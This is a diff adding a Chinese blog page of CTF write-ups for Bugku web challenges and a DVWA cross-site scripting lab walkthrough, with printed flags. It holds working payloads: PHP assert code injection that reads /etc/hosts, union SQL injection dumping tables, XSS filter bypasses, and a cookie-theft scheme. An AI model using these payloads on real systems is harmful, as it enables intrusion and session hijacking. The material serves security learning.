@@ -336,6 +336,1216 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/19/bugku-26-27/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/19/bugku-26-27/" class="post-title-link" itemprop="url">bugku 26-27 writeup(web)</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-19 20:12:05 / 修改时间：20:21:30" itemprop="dateCreated datePublished" datetime="2019-03-19T20:12:05+08:00">2019-03-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、第26题（过狗一句话）"><a href="#一、第26题（过狗一句话）" class="headerlink" title="一、第26题（过狗一句话）"></a>一、第26题（过狗一句话）</h2><p><img src="/2019/03/19/bugku-26-27/1.jpg" alt="在这里插入图片描述"><br>打开链接发现一篇空白，抓包也没什么发现。那么我们只能分析上面那段代码了<br>explode()函数就是把<code>$poc</code>变量用#号来分割开来。那么<code>$poc_2</code>就是assert,他和最后一句代码构造成了assert()函数,assert函数功能跟eval类似，可以把里面的内容当作代码来执行。</p>
+<p>那么我们构造payload为<code>?s=print_r(scandir(&#39;./&#39;))</code>，扫描出描本级目录下的文件。（这其实是一种xss攻击）<br><img src="/2019/03/19/bugku-26-27/2.jpg" alt="在这里插入图片描述"><br>发现了flag_sm1skla1.txt文件。访问该文件即可得出flag<br><img src="/2019/03/19/bugku-26-27/3.jpg" alt="在这里插入图片描述"><br>拓展：<br>我们扫描上级目录</p>
+<pre><code>http://123.206.87.240:8010/?s=print_r(scandir(%27../%27))
+</code></pre><p><img src="/2019/03/19/bugku-26-27/6.jpg" alt="在这里插入图片描述"><br>根据目录结构应该是linux系统，hosts文件应该在etc里面</p>
+<pre><code>http://123.206.87.240:8010/?s=print_r(readfile(%27../etc/hosts%27))
+</code></pre><p><img src="/2019/03/19/bugku-26-27/4.jpg" alt="在这里插入图片描述"></p>
+<h2 id="一、第27题（字符？正则？）"><a href="#一、第27题（字符？正则？）" class="headerlink" title="一、第27题（字符？正则？）"></a>一、第27题（字符？正则？）</h2><p>打开题目，是一段代码</p>
+<pre><code> &lt;?php 
+highlight_file(&apos;2.php&apos;);
+$key=&apos;KEY{********************************}&apos;;
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+if( $IM ){ 
+  die(&apos;key is: &apos;.$key);
+}
+?&gt; 
+</code></pre><p>分析这段代码可以发现，只要我们构造出一个符号条件的KEY作为参数传入即可得到flag,突然发现我的正则学了和没学一样。</p>
+<p>这边先介绍下</p>
+<p><strong>preg_match — 执行一个正则表达式匹配</strong></p>
+<pre><code>preg_match ( $pattern , $subject , $matches )
+</code></pre><p>搜索subject与pattern给定的正则表达式的一个匹配.</p>
+<p>参数 ：</p>
+<p>pattern : 要搜索的模式，字符串类型(正则表达式)。<br>subject : 输入的字符串。<br>matches :（可有可无）如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</p>
+<p>返回值 ：</p>
+<p>preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
+<pre><code>实例1：
+
+$label = &apos;content/112&apos;;
+$a = preg_match(&apos;#content/(\d+)#i&apos;, $label, $mc);
+var_dump($a);
+var_dump($mc);
+输出：
+
+int(1)
+array(2) {
+ [0]=&gt;
+ string(11) &quot;content/112&quot;
+ [1]=&gt;
+ string(3) &quot;112&quot;
+}
+</code></pre><p><strong>开始分析下题目中的正则表达式</strong><br>定界符：/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
+<pre><code>. （一个点）：表示可以匹配任何字符；
+
+*   ：前面的字符重复零次或多次；
+
+{n,m} ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符;
+
+\ （反斜线）：后面的字符被转义；
+
+[a-z] ：在a到z中匹配 ；
+
+[[:punct:]] ：匹配任何标点符号；
+
+/i  ：表示这个正则表达式对大小写不敏感；
+</code></pre><p>我们构造<code>id=keykeyaaaakey:/a/keyz;</code><br><img src="/2019/03/19/bugku-26-27/5.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/19/bugku-22-24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/19/bugku-22-24/" class="post-title-link" itemprop="url">bugku 22-24 write up（web）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-19 20:07:29 / 修改时间：20:11:28" itemprop="dateCreated datePublished" datetime="2019-03-19T20:07:29+08:00">2019-03-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、第22题（速度要快"><a href="#一、第22题（速度要快" class="headerlink" title="一、第22题（速度要快)"></a>一、第22题（速度要快)</h2><p>首先我们查看源码</p>
+<pre><code>&lt;/br&gt;我感觉你得快点!!!&lt;!-- OK ,now you have to post the margin what you find --&gt;
+</code></pre><p>发现有post需要提交，参数为marign</p>
+<p>那么我们开始抓包，<br><img src="/2019/03/19/bugku-22-24/1.jpg" alt="在这里插入图片描述"><br>然后发现是base64编码的flag,解码后，输入flag,发现flag错误。<br>额，我们再次抓包，发现flag又变化了。怪得题目说我觉得你得快点。<br>我有尝试了几次发现还是不行，看来只能借助python脚本了</p>
+<pre><code>import requests
+import base64
+url = &apos;http://123.206.87.240:8002/web6/&apos;
+s = requests.session()
+flag = s.get(url).headers[&apos;flag&apos;]  # flag在响应头里
+
+ #为了下面使用split不报错，ba64decode操作的对象是byte类型的字符串，而split函数要用str类型
+flag = base64.b64decode(flag).decode()
+
+flag = base64.b64decode(flag.split(&quot;:&quot;)[1]).decode()  # 获取flag后的值
+payload = {&apos;margin&apos;: flag}
+print(s.post(url, data = payload).text)  # post方法上传
+</code></pre><p><strong>python中str是经过编好码的字符串，如unicode,gb2312,ascii编码，可以表示不同语言中的字符，可以解码成byte<br>byte是字节，只能是ascii码0-255的字符，表示未经编码处理的原始字符串</strong></p>
+<p><a href="http://www.runoob.com/python/att-string-split.html" target="_blank" rel="noopener">split函数</a>简单的介绍</p>
+<p>str与byte的简单的转化方法：</p>
+<pre><code>flag=flag.decode()//byte转为str
+flag=flag.encode()//str转为byte
+</code></pre><h2 id="二、第23题（cookie欺骗）"><a href="#二、第23题（cookie欺骗）" class="headerlink" title="二、第23题（cookie欺骗）"></a>二、第23题（cookie欺骗）</h2><p><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a><br>打开题目发现，filename参数后面是一串base64编码，进行解码得keys.txt.<br>我们把index.php进行base64编码后放在filename参数的后面，进行输入</p>
+<pre><code>http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw
+</code></pre><p>改变line后面的数字即可一行一行的输出index.php的内容<br>这样子太慢了，我们写个python脚本来实现。</p>
+<pre><code>import requests
+def getHTMLText(url):
+    try:
+        r = requests.get(url,timeout=30)
+        r.raise_for_status()
+        r .encoding = r.apparent_encoding
+        return r.text
+    except:
+        return&quot;产生异常&quot;
+if __name__==&quot;__main__&quot;:
+    a=30
+    for i in range(a):
+        url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot;
+        print(getHTMLText(url))
+</code></pre><p>输出index.php的网页源码</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+
+$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);
+
+$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;
+
+if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
+
+$file_list = array(
+
+&apos;0&apos; =&gt;&apos;keys.txt&apos;,
+
+&apos;1&apos; =&gt;&apos;index.php&apos;,
+
+);
+</code></pre><p>​<br>    if(isset($_COOKIE[‘margin’]) &amp;&amp; $_COOKIE[‘margin’]==’margin’){</p>
+<pre><code>$file_list[2]=&apos;keys.php&apos;;
+
+}
+
+if(in_array($file, $file_list)){
+
+$fa = file($file);
+
+echo $fa[$line];
+
+}
+
+?&gt;
+</code></pre><p>这段代码的意思是flag在keys.php文件里，我们需要传入cookie:margin=margin才可以看到源码。<br><img src="/2019/03/19/bugku-22-24/2.jpg" alt="在这里插入图片描述"><br>进行操作后发现是空白，我们查看源码发现了flag<br><img src="/2019/03/19/bugku-22-24/3.jpg" alt="在这里插入图片描述"></p>
+<h2 id="三、第24题（never-give-up）"><a href="#三、第24题（never-give-up）" class="headerlink" title="三、第24题（never give up）"></a>三、第24题（never give up）</h2><p>查看源码发现<br><img src="/2019/03/19/bugku-22-24/4.jpg" alt="在这里插入图片描述"><br>那么我们访问<code>http://123.206.87.240:8006/test/1p.html</code><br>发现是bugku的主页，被重定向了。<br>那么我们使用</p>
+<pre><code>view-source:http://123.206.87.240:8006/test/1p.htm
+</code></pre><p>直接访问源码，发现源码中有一部分被url编码了，那么我们进行解码，发现是base64编码，再解码发现是url编码，那么我们再解码，终于得出了以下关键的部分</p>
+<pre><code>&quot;;if(!$_GET[&apos;id&apos;])
+{
+    header(&apos;Location: hello.php?id=1&apos;);
+    exit();
+}
+$id=$_GET[&apos;id&apos;];
+$a=$_GET[&apos;a&apos;];
+$b=$_GET[&apos;b&apos;];
+if(stripos($a,&apos;.&apos;))
+{
+    echo &apos;no no no no no no no&apos;;
+    return ;
+}
+$data = @file_get_contents($a,&apos;r&apos;);
+if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+    require(&quot;f4l2a3g.txt&quot;);
+}
+else
+{
+    print &quot;never never never give up !!!&quot;;
+}
+</code></pre><p>​<br>    ?&gt;</p>
+<p>看下这部分源码发现有很多要求才可以看到flag,那么尝试下直接访问</p>
+<pre><code>http://123.206.87.240:8006/test/f4l2a3g.txt
+</code></pre><p>看到flag了。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/bugku-17-20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/14/bugku-17-20/" class="post-title-link" itemprop="url">bugku 17-20 write up（web）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-14 16:09:36" itemprop="dateCreated datePublished" datetime="2019-03-14T16:09:36+08:00">2019-03-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-19 20:08:58" itemprop="dateModified" datetime="2019-03-19T20:08:58+08:00">2019-03-19</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、第17题（输入密码查看flag）。"><a href="#一、第17题（输入密码查看flag）。" class="headerlink" title="一、第17题（输入密码查看flag）。"></a>一、第17题（输入密码查看flag）。</h2><p>暴力破解，可得密码，然后输入密码可得flag<br><img src="/2019/03/14/bugku-17-20/1.jpg" alt="flag{bugku-baopo-hah}"></p>
+<h2 id="二、-第18题-点击一百万次"><a href="#二、-第18题-点击一百万次" class="headerlink" title="二、 第18题(点击一百万次)"></a>二、 第18题(点击一百万次)</h2><p><img src="/2019/03/14/bugku-17-20/2.jpg" alt="在这里插入图片描述"><br>查看源码可以发现，url以post的方式提交点击的次数，那么使用hacker的post功能，直接修改clicks=1000000,即可得出flag<br><img src="/2019/03/14/bugku-17-20/3.jpg" alt="在这里插入图片描述"></p>
+<h2 id="三、第19题（备份是个好习惯）"><a href="#三、第19题（备份是个好习惯）" class="headerlink" title="三、第19题（备份是个好习惯）"></a>三、第19题（备份是个好习惯）</h2><p><strong>小知识：</strong>备份文件的扩展名一般为*.swp，.bak<br>打开题目是一串字母，应该是MD5加密我们拿去解密下，竟然为空。<br>看看题目的提示，备份是个好习惯，是让我们寻找  .bak文件的<br>我们用御剑扫描后台，得出<br><img src="/2019/03/14/bugku-17-20/4.jpg" alt="在这里插入图片描述"><br>那么尝试下<code>http://123.06.87.240:8002/web16/index.php.bak</code><br>成功下载源码</p>
+<pre><code>&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);
+$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//代码从?后开始截取到str中，也就是变量后开始截取字符串
+$str = substr($str,1);//取$str中左边第1位开始取1位。
+$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//在字符串$str中找到字符串key，并把它替换成空；
+parse_str($str);//把查询字符串解析到变量中；
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+    echo $flag.&quot;取得flag&quot;;
+}
+</code></pre><p>代码要求我们构造出key1和key2的md5值相等，而它们本身却不相等，这时候用到一个小知识点：md5无法对数组进行构造，构造的结果都为NULL，这样我们只要让key1和key2是两个数组就可以了，（kekeyy绕过过滤key）<br><img src="/2019/03/14/bugku-17-20/5.jpg" alt="在这里插入图片描述"></p>
+<h2 id="四、第20题（成绩单）在这里插入代码片"><a href="#四、第20题（成绩单）在这里插入代码片" class="headerlink" title="四、第20题（成绩单）在这里插入代码片"></a>四、第20题（成绩单）<code>在这里插入代码片</code></h2><p>我们先输入1发现输出<br><img src="/2019/03/14/bugku-17-20/6.jpg" alt="在这里插入图片描述"><br>输入-1发现没有输出信息<br>说明存在sql注入。<br>那么我们尝试下<br>输入 <code>-1&#39; union select 1,2,3,database()#</code><br><img src="/2019/03/14/bugku-17-20/7.jpg" alt="在这里插入图片描述"><br>发现flag的所在的数据库<br>输入<code>-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br><img src="/2019/03/14/bugku-17-20/8.jpg" alt="在这里插入图片描述"><br>爆出flag所在的表 </p>
+<p>输入<code>-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code><br><img src="/2019/03/14/bugku-17-20/9.jpg" alt="vaoc"><br>爆出flag所在的字段</p>
+<p>输入<code>-1&#39; union select 1,2,3,skctf_flag from fl4g#</code></p>
+<p><img src="/2019/03/14/bugku-17-20/10.jpg" alt="在这里插入图片描述"><br>爆出flag为BUGKU{Sql_INJECT0N_4813drd8hz4}</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/DVWA-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/14/DVWA-xss/" class="post-title-link" itemprop="url">DVWA之xss</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-14 15:58:22 / 修改时间：16:08:39" itemprop="dateCreated datePublished" datetime="2019-03-14T15:58:22+08:00">2019-03-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/DVWA/" itemprop="url" rel="index"><span itemprop="name">DVWA</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、反射（reflected）型"><a href="#一、反射（reflected）型" class="headerlink" title="一、反射（reflected）型"></a>一、反射（reflected）型</h2><p><strong>（一）、尝试low等级</strong><br>输入正常数字，返回以下内容<br><img src="/2019/03/14/DVWA-xss/1.jpg" alt="在这里插入图片描述"><br>再输入<code>&lt;xss&gt;</code>发现，只输出了hello<br><img src="/2019/03/14/DVWA-xss/2.jpg" alt="在这里插入图片描述"><br>我们使用火狐的开发者工具查看下元素<br>发现hello的后面是一对xss标签<br><img src="/2019/03/14/DVWA-xss/3.jpg" alt="在这里插入图片描述"><br>我们进行弹窗测试<br>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>发现弹窗，说明存在xss注入<br><img src="/2019/03/14/DVWA-xss/4.jpg" alt="在这里插入图片描述"><br>介绍javaScript的3个弹窗函数<br>alert()     ,confirm()   ,prompt()<br><img src="/2019/03/14/DVWA-xss/5.jpg" alt="在这里插入图片描述"><br><strong>攻击者思路</strong><br><img src="/2019/03/14/DVWA-xss/6.jpg" alt="在这里插入图片描述"><br>攻击者web设计<br><img src="/2019/03/14/DVWA-xss/7.jpg" alt="在这里插入图片描述"><br>构造估计的js脚本</p>
+<p>document.location就是页面的内容定位到指定的位置，他会访问参数中的地址，参数里面写上刚刚新建的php文件的网址，document.cookie就是赋值给这个php的cookie参数，这个cookie值最终会出现在网站127.0.0.1/cookie.php中<br><img src="/2019/03/14/DVWA-xss/8.jpg" alt="在这里插入图片描述"><br>构造并发送攻击url<br><img src="/2019/03/14/DVWA-xss/9.jpg" alt="在这里插入图片描述"><br>这样子还不行还需要url编码<br><img src="/2019/03/14/DVWA-xss/10.jpg" alt="在这里插入图片描述">最后劫持会话<br>修改cookie，修改为之前获取的cookie值。</p>
+<p><strong>（二）、尝试medium等级，</strong><br>只要在<code>&lt;srcipt&gt;标签中插入一个&lt;script&gt;即可，&lt;src&lt;srcipt&gt;ipt&gt;，</code>因为他过滤了<code>&lt;sript&gt;</code>标签其他步骤与low等级一样。<br><strong>（三）尝试high等级。</strong><br>上面的方法都失效了，那么我们想到了img标签也是可以执行js代码的</p>
+<pre><code>&lt;img src= x onerror=alert(1)&gt;
+</code></pre><p><img src="/2019/03/14/DVWA-xss/11.jpg" alt="在这里插入图片描述"><br>使用iframe标签也可以成功注入<code>&lt;iframe onload=alert(1)&gt;</code><br>说明只过滤了script标签<br><strong>（四）impose等级</strong><br>查看源码<br><img src="/2019/03/14/DVWA-xss/12.jpg" alt="在这里插入图片描述"><br>发现htmlspecialchars函数<br>那么这是函数是干啥的呢？<br>可以把</p>
+<pre><code> &amp;过滤成&amp;amp;
+&quot;过滤成&amp;quto;
+&apos;过滤成&amp;apos;
+&lt;过滤成&amp;lt;
+&gt;过滤成&amp;gt;
+</code></pre><h2 id="二、存储型（stored）反射"><a href="#二、存储型（stored）反射" class="headerlink" title="二、存储型（stored）反射"></a>二、存储型（stored）反射</h2><p><strong>（一）、尝试low等级</strong>，<br>使用火狐浏览器开发者工具，发现name被限制为10个字符，message被限制为50个字符.这对我们xss注入是不够的。<br><img src="/2019/03/14/DVWA-xss/13.jpg" alt="在这里插入图片描述"><br>那么我们就抓包发送name,message参数<br>成功绕过了限制<br><img src="/2019/03/14/DVWA-xss/14.jpg" alt="在这里插入图片描述"><br>存储型的数据是存在数据库里，大家可以选择<br>setup/resetDB重置数据库，清楚数据<br><strong>（二）尝试medium等级</strong><br>发现name过滤alert ,和script标签，message过滤了script标签。尝试script大小写发现无法弹窗<br>这个是部分源码<br><img src="/2019/03/14/DVWA-xss/15.jpg" alt="在这里插入图片描述"><br>我们尝试iframe标签</p>
+<pre><code>txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook
+</code></pre><p><img src="/2019/03/14/DVWA-xss/16.jpg" alt="在这里插入图片描述"><br>发现name成功弹窗,但是message不行，不过没关系，可以进行xss注入</p>
+<p><strong>（三）、尝试high等级</strong><br>和medium的方法一样，不同是high等级的message对&lt; &gt; “ &amp; ‘进行了处理<br><strong>（四）、尝试impose等级</strong><br>查看源码<br><img src="/2019/03/14/DVWA-xss/17.jpg" alt="在这里插入图片描述"><br>name和message都对&lt; &gt; \” &amp; \’进行了过滤</p>
+<h2 id="三、DOM型XSS"><a href="#三、DOM型XSS" class="headerlink" title="三、DOM型XSS"></a>三、DOM型XSS</h2><p><strong>（一）、尝试low等级</strong><br>我们尝试注入</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt;
+</code></pre><p><img src="/2019/03/14/DVWA-xss/18.jpg" alt="在这里插入图片描述"><br>成功进行注入，查看源码发现，没有任何保护措施<br><img src="/2019/03/14/DVWA-xss/19.jpg" alt="在这里插入图片描述"><br><strong>（二）、尝试medium等级</strong><br>发现low等级的方法已经失效了，经过尝试可以发现，script标签被过滤了，过滤成English。<br>查看源码发现只过滤了script标签<br><img src="/2019/03/14/DVWA-xss/20.jpg" alt="在这里插入图片描述"><br>那么我们尝试 下<code>&lt;img src= x onerror=alert(1)&gt;</code><br>页面没有反应<br>查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，使用img标签没有发挥作用<br><img src="/2019/03/14/DVWA-xss/21.jpg" alt="在这里插入图片描述"><br>我们尝试闭合option</p>
+<pre><code>`http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt;
+</code></pre><p>发现还没没有闭合成功。<br><img src="/2019/03/14/DVWA-xss/22.jpg" alt="在这里插入图片描述"><br>我们闭合用的&gt;&lt;被闭合到option的值当中去了<br>。那么我们往更高一层的select标签闭合</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/xss_d/?default=  &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt;
+</code></pre><p>成功注入<br><img src="/2019/03/14/DVWA-xss/23.jpg" alt="在这里插入图片描述"><br><strong>（三）、尝试high等级</strong><br>尝试了一番之后没有结果<br>我们查看下源码，发现源码使用了白名单的方法，<br><img src="/2019/03/14/DVWA-xss/24.jpg" alt="在这里插入图片描述"><br>那我们是不是可以使用#注入，第一次从本地写入，第二次刷新的时候执行我们注入的xss</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt;
+</code></pre><p>成功注入<br><img src="/2019/03/14/DVWA-xss/25.jpg" alt="在这里插入图片描述"></p>
+<h2 id="（四）、impose等级"><a href="#（四）、impose等级" class="headerlink" title="（四）、impose等级"></a>（四）、impose等级</h2><p>发现我们输入什么都会在客户端体现，查看源码<br><img src="/2019/03/14/DVWA-xss/26.jpg" alt="在这里插入图片描述"><br>发现在客户端进行了保护。<br><img src="/2019/03/14/DVWA-xss/27.jpg" alt="在这里插入图片描述"><br>这段代码的功能是<br>不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS，这就是为什么我们输入什么就会在框中体现<br><img src="/2019/03/14/DVWA-xss/28.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/file-upload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
